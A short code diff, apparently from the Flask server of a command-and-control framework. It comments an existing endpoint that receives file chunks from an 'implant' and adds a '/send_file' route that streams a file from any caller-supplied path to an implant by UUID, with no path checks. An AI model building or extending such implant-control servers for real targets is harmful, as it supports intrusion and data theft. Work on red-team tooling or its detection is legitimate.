@@ -54,6 +54,7 @@ def get_commands(uuid):
     return jsonify(commands), 200
 
 
+# endpoint for the implant that receives chunks
 @BP.route("/files", methods=["POST"])
 def post_file():
     data = request.get_json()
@@ -90,3 +91,15 @@ def get_files():
     if file_ids is None:
         return jsonify({"message": "No files found"}), 404
     return jsonify(file_ids), 200
+
+
+@BP.route("/send_file", methods=["POST"])
+def send_file():
+    data = request.get_json()
+    implant_uuid = data.get("uuid")
+    file_path = data.get("file_path")
+
+    if not implant_uuid or not file_path:
+        return jsonify({"status": "Invalid data"}), 400
+
+    return services.stream_file(file_path)
